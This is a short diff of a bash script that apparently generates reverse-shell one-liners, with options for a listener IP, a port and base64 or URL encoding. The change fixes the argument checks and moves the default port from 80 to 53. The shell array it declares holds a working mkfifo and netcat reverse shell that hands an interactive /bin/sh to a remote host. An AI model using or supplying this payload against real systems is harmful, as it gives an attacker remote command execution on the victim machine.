@@ -1,8 +1,8 @@
 #!/bin/bash
 if [[ -n "$1" ]]; then ip="$1"; else ip="$lip"; fi
-if [[ -n "$2" ]]; then port="$2"; else port="80"; fi
-if [[ -n "$3" ; "$3" == 'b64' ]]; then B64='true'; fi
-if [[ -n "$3" ; "$3" == 'url' ]]; then URL='true'; fi
+if [[ -n "$2" ]]; then port="$2"; else port="53"; fi
+if [[ "$3" == 'b64' ]]; then B64='true'; fi
+if [[ "$3" == 'url' ]]; then URL='true'; fi
 
 declare -a shell_arr=(
   "rm /var/tmp/.f ; mkfifo /var/tmp/.f ; cat /var/tmp/.f|/bin/sh -i 2>&1|nc $ip $port >/var/tmp/.f"
